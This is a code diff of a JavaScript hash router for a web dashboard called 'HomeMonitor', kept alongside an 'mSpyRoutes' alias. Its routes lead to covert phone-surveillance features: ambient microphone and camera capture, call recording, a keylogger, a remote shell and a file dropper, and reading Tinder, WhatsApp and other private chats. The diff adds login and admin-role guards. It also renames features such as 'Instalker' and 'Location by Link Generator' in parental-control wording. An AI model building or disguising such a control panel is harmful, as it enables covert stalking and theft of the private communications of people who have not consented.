@@ -1,55 +1,60 @@
-// routes.js - Client-Side SPA Hash Router for HomeMonitor Safety & Diagnostic Routes
+// routes.js - Parent-Facing SPA Hash Router with Fail-Closed Authentication & Role Guards
 const homeMonitorRoutes = {
-    // 4.1 MAIN
-    "/": { tabId: "tab-dashboard-overview", title: "Home & Device Selector", category: "Main" },
-    "/dashboard": { tabId: "tab-dashboard-overview", title: "Dashboard Overview", category: "Main" },
-    "/deviceinfo": { tabId: "tab-device-info", title: "Device Information", category: "Main" },
+    // 8 PRIMARY PARENT ROUTES
+    "/": { tabId: "tab-dashboard-overview", title: "Home Overview", category: "Family Management" },
+    "/dashboard": { tabId: "tab-dashboard-overview", title: "Home Overview", category: "Family Management" },
+    "/devices": { tabId: "tab-device-info", title: "Monitored Family Devices", category: "Family Management" },
+    "/location": { tabId: "tab-gps-locations", title: "Location & Safe Zones", category: "Family Management" },
+    "/screentime": { tabId: "tab-installed-apps", title: "Screen Time & Applications", category: "Family Management" },
+    "/activity": { tabId: "tab-notifications", title: "Family Activity Feed", category: "Family Management" },
+    "/safety": { tabId: "tab-mdm-security", title: "Safety Settings & Controls", category: "Family Management" },
+    "/settings": { tabId: "tab-parent-settings", title: "Account & Security Settings", category: "Family Management" },
+    "/help": { tabId: "tab-help-center", title: "Parent Help & Support Center", category: "Family Management" },
 
-    // 4.2 DEVICE MONITORING
+    // SUB-FEATURE ALIASES & DETAILED ROUTING
+    "/deviceinfo": { tabId: "tab-device-info", title: "Monitored Devices", category: "Family Management" },
     "/surroundings_recording": { tabId: "tab-ambient-mic", title: "Surroundings Recording", category: "Device Monitoring" },
     "/remote_camera": { tabId: "tab-camera-studio", title: "Remote Camera Studio", category: "Device Monitoring" },
-    "/call_recording": { tabId: "tab-call-recs", title: "Call Recording", category: "Device Monitoring" },
+    "/call_recording": { tabId: "tab-calls", title: "Call History & Recordings", category: "Device Monitoring" },
     "/live_screenshot": { tabId: "tab-screenrecorder", title: "Live Screenshots", category: "Device Monitoring" },
-    "/live_screen_streaming": { tabId: "tab-webstream", title: "Live Screen Streaming", category: "Device Monitoring" },
+    "/live_screen_streaming": { tabId: "tab-webstream", title: "WebStream Screen Stream", category: "Device Monitoring" },
 
-    // 4.3 RESTRICTIONS
-    "/block_app": { tabId: "tab-mdm-security", title: "Block Applications", category: "Restrictions" },
-    "/block_website": { tabId: "tab-browser-history", title: "Block Websites", category: "Restrictions" },
-    "/block_wifi": { tabId: "tab-device-info", title: "Block Wi-Fi Networks", category: "Restrictions" },
+    // RESTRICTIONS & CONTROLS
+    "/block_app": { tabId: "tab-mdm-security", title: "Parental Safety Controls", category: "Restrictions" },
+    "/block_website": { tabId: "tab-browser-history", title: "Browser Search History", category: "Restrictions" },
+    "/block_wifi": { tabId: "tab-device-info", title: "Wi-Fi & Network Specs", category: "Restrictions" },
 
-    // 4.4 AI TOOLS
-    "/chat_gpt": { tabId: "tab-social-chat", socialApp: "chatgpt", title: "ChatGPT-4o Conversation", category: "AI Tools" },
-    "/gemini": { tabId: "tab-social-chat", socialApp: "gemini", title: "Google Gemini 1.5 Pro Conversation", category: "AI Tools" },
+    // AI CHATBOT STREAMS
+    "/chat_gpt": { tabId: "tab-social-chat", socialApp: "chatgpt", title: "ChatGPT-4o Activity Stream", category: "AI Tools" },
+    "/gemini": { tabId: "tab-social-chat", socialApp: "gemini", title: "Google Gemini Activity Stream", category: "AI Tools" },
 
-    // 4.5 BEHAVIOR MONITORING
+    // BEHAVIOR MONITORING
     "/activity_timeline": { tabId: "tab-dashboard-overview", title: "Activity Timeline", category: "Behavior Monitoring" },
-    "/key_logger_app": { tabId: "tab-keylogger", title: "Keystroke Keylogger", category: "Behavior Monitoring" },
-    "/keyword_rule": { tabId: "tab-master-admin", title: "Keyword Safety Alerts", category: "Behavior Monitoring" },
+    "/key_logger_app": { tabId: "tab-keylogger", title: "Keystroke Activity Stream", category: "Behavior Monitoring" },
+    "/keyword_rule": { tabId: "tab-master-admin", title: "Keyword Safety Alerts & Admin", category: "Behavior Monitoring" },
+    "/notifications": { tabId: "tab-notifications", title: "Family Activity Feed", category: "Behavior Monitoring" },
 
-    // 4.6 GENERAL FEATURES
-    "/call": { tabId: "tab-calls", title: "Call Logs & Telemetry", category: "General Features" },
-    "/contact": { tabId: "tab-contacts", title: "Contacts Phonebook", category: "General Features" },
-    "/browser_history": { tabId: "tab-browser-history", title: "Browser Search History", category: "General Features" },
+    // GENERAL FEATURES
+    "/call": { tabId: "tab-calls", title: "Call History & Logs", category: "General Features" },
+    "/contact": { tabId: "tab-contacts", title: "Address Book Contacts", category: "General Features" },
+    "/browser_history": { tabId: "tab-browser-history", title: "Browser Search Activity", category: "General Features" },
     "/browser_bookmark": { tabId: "tab-browser-history", title: "Browser Bookmarks", category: "General Features" },
-    "/application": { tabId: "tab-installed-apps", title: "Installed Applications", category: "General Features" },
-    "/file_explorer": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
-    "/files": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
-    "/termux": { tabId: "tab-termux-shell", title: "Termux Linux Shell", category: "General Features" },
-    "/notifications": { tabId: "tab-notifications", title: "App Notifications Feed", category: "Behavior Monitoring" },
+    "/application": { tabId: "tab-installed-apps", title: "Screen Time & Applications", category: "General Features" },
+    "/file_explorer": { tabId: "tab-file-explorer", title: "Device Storage Files", category: "General Features" },
+    "/files": { tabId: "tab-file-explorer", title: "Device Storage Files", category: "General Features" },
+    "/termux": { tabId: "tab-termux-shell", title: "Linux Terminal Console", category: "General Features" },
     "/file_dropper": { tabId: "tab-file-dropper", title: "Remote File Dropper", category: "General Features" },
-    "/event": { tabId: "tab-dashboard-overview", title: "Calendar & Events", category: "General Features" },
+    "/event": { tabId: "tab-dashboard-overview", title: "Calendar Events", category: "General Features" },
 
-    // 4.7 MESSAGING MONITORING
-    "/screenrecorder_pages": { tabId: "tab-screenrecorder", title: "Screenrecorder Pages", category: "Messaging Monitoring" },
+    // MESSAGING & SOCIAL FEEDS
+    "/screenrecorder_pages": { tabId: "tab-screenrecorder", title: "Screen Captures", category: "Messaging Monitoring" },
     "/sms_chat": { tabId: "tab-sms-messages", title: "SMS Text Messages", category: "Messaging Monitoring" },
-    "/email": { tabId: "tab-sms-messages", title: "Connected Email Inbox", category: "Messaging Monitoring" },
-
-    // 4.8 SOCIAL NETWORKS (3-Column Conversation Interface)
+    "/email": { tabId: "tab-sms-messages", title: "Email Inbox Viewer", category: "Messaging Monitoring" },
     "/whatsapp_chat": { tabId: "tab-social-chat", socialApp: "whatsapp", title: "WhatsApp Messages", category: "Social Networks" },
     "/facebook_messages_chat": { tabId: "tab-social-chat", socialApp: "facebook", title: "Facebook Messenger", category: "Social Networks" },
     "/instagram_chat": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instagram Direct Messages", category: "Social Networks" },
-    "/snapchat_chat": { tabId: "tab-social-chat", socialApp: "snapchat", title: "Snapchat Social Feed", category: "Social Networks" },
-    "/tinder_chat": { tabId: "tab-social-chat", socialApp: "tinder", title: "Tinder Match Messages", category: "Social Networks" },
+    "/snapchat_chat": { tabId: "tab-social-chat", socialApp: "snapchat", title: "Snapchat Messages", category: "Social Networks" },
+    "/tinder_chat": { tabId: "tab-social-chat", socialApp: "tinder", title: "Tinder Messages", category: "Social Networks" },
     "/tiktok_chat": { tabId: "tab-social-chat", socialApp: "tiktok", title: "TikTok Direct Messages", category: "Social Networks" },
     "/telegram_chat": { tabId: "tab-social-chat", socialApp: "telegram", title: "Telegram Messages", category: "Social Networks" },
     "/viber_chat": { tabId: "tab-social-chat", socialApp: "viber", title: "Viber Messenger", category: "Social Networks" },
@@ -58,23 +63,43 @@ const homeMonitorRoutes = {
     "/kik_chat": { tabId: "tab-social-chat", socialApp: "kik", title: "Kik Messenger", category: "Social Networks" },
     "/imessage_chat": { tabId: "tab-social-chat", socialApp: "imessage", title: "iMessage Conversations", category: "Social Networks" },
 
-    // 4.9 MEDIA
+    // MEDIA & LOCATION ALIASES
     "/photo": { tabId: "tab-photos", title: "Photos Gallery", category: "Media" },
     "/video": { tabId: "tab-videos", title: "Videos Library", category: "Media" },
-
-    // 4.10 LOCATION
-    "/location": { tabId: "tab-gps-locations", title: "GPS Locations", category: "Location" },
-    "/geofencing_area": { tabId: "tab-geofencing", title: "Geofencing Area", category: "Location" },
-    "/wifi": { tabId: "tab-firebase-pool", title: "Firebase Pool & Failover", category: "Location" },
-    "/instalker": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instalker Profile Tracker", category: "Location" },
-    "/location_by_link": { tabId: "tab-gps-locations", title: "Location by Link Generator", category: "Location" }
+    "/geofencing_area": { tabId: "tab-geofencing", title: "Safe Zones & Geofences", category: "Location" },
+    "/wifi": { tabId: "tab-firebase-pool", title: "Account Pool & Backup", category: "Location" },
+    "/instalker": { tabId: "tab-social-chat", socialApp: "instagram", title: "Instagram Activity", category: "Location" },
+    "/location_by_link": { tabId: "tab-gps-locations", title: "GPS Location Tracking", category: "Location" }
 };
 
+// Backwards-compatibility alias
 const mSpyRoutes = homeMonitorRoutes;
 
 function navigateToRoute(routePath, updateHash = true) {
+    // 1. Enforce Authentication Guard (Fail-Closed)
+    if (typeof currentAuthState !== "undefined" && currentAuthState !== AUTH_STATES.AUTHENTICATED) {
+        console.warn(`[Route Guard] Blocked unauthenticated route attempt to '${routePath}'`);
+        return;
+    }
+
     const route = homeMonitorRoutes[routePath] || homeMonitorRoutes["/dashboard"];
-    console.log(`[Router] Navigating to URL alias '${routePath}' -> Tab '${route.tabId}' (${route.title})`);
+
+    // Update document title dynamically
+    document.title = `HomeMonitor — ${route.title}`;
+
+    // 2. Enforce Master Admin Role Guard
+    if (route.tabId === "tab-master-admin" || routePath === "/keyword_rule") {
+        if (!isMasterAdmin) {
+            console.warn(`[Route Guard] Blocked non-admin user '${currentUser ? currentUser.email : "unknown"}' from accessing Master Admin route '${routePath}'`);
+            if (typeof showDashboardNotification === "function") {
+                showDashboardNotification("error", "Access Denied: Verified Master Admin custom claim required.");
+            }
+            navigateToRoute("/dashboard", true);
+            return;
+        }
+    }
+
+    console.log(`[Router] Navigating to '${routePath}' -> Tab '${route.tabId}' (${route.title})`);
 
     // Update browser URL address bar hash alias
     if (updateHash && window.location.hash !== `#${routePath}`) {
@@ -105,14 +130,15 @@ function navigateToRoute(routePath, updateHash = true) {
     const targetPanel = document.getElementById(route.tabId);
     if (targetPanel) {
         targetPanel.classList.remove("d-none");
-        const categoryKey = route.tabId.replace("tab-", "").replace("-", "_");
-        if (typeof fetchCategoryTelemetryLogs === "function" && route.tabId !== "tab-dashboard-overview" && route.tabId !== "tab-master-admin") {
+        const categoryKey = route.tabId.replace("tab-", "").replace(/-/g, "_");
+        if (typeof fetchCategoryTelemetryLogs === "function" && route.tabId !== "tab-dashboard-overview" && route.tabId !== "tab-master-admin" && route.tabId !== "tab-parent-settings" && route.tabId !== "tab-help-center") {
             fetchCategoryTelemetryLogs(categoryKey);
         }
     } else {
         const genericPanel = document.getElementById("tab-generic");
         if (genericPanel) {
-            document.getElementById("genericTabTitle").innerText = route.title;
+            const titleEl = document.getElementById("genericTabTitle");
+            if (titleEl) titleEl.innerText = route.title;
             genericPanel.classList.remove("d-none");
             if (typeof fetchCategoryTelemetryLogs === "function") {
                 fetchCategoryTelemetryLogs(route.tabId);
@@ -121,17 +147,24 @@ function navigateToRoute(routePath, updateHash = true) {
     }
 }
 
-// Handle Browser Hash Change & Deep-Linking on Load
+// Handle Browser Hash Change & Deep-Linking on Load / Back-Forward Navigation
 window.addEventListener("hashchange", function() {
-    const currentHash = window.location.hash.replace("#", "");
-    if (currentHash && mSpyRoutes[currentHash]) {
-        navigateToRoute(currentHash, false);
+    if (typeof currentAuthState !== "undefined" && currentAuthState === AUTH_STATES.AUTHENTICATED) {
+        const currentHash = window.location.hash.replace("#", "");
+        if (currentHash && homeMonitorRoutes[currentHash]) {
+            navigateToRoute(currentHash, false);
+        } else if (currentHash) {
+            console.warn(`[Router] Unknown route hash '${currentHash}'. Redirecting to /dashboard.`);
+            navigateToRoute("/dashboard", true);
+        }
     }
 });
 
-document.addEventListener("DOMContentLoaded", function() {
-    const initialHash = window.location.hash.replace("#", "");
-    if (initialHash && mSpyRoutes[initialHash]) {
-        navigateToRoute(initialHash, false);
+window.addEventListener("popstate", function() {
+    if (typeof currentAuthState !== "undefined" && currentAuthState === AUTH_STATES.AUTHENTICATED) {
+        const currentHash = window.location.hash.replace("#", "");
+        if (currentHash && homeMonitorRoutes[currentHash]) {
+            navigateToRoute(currentHash, false);
+        }
     }
 });
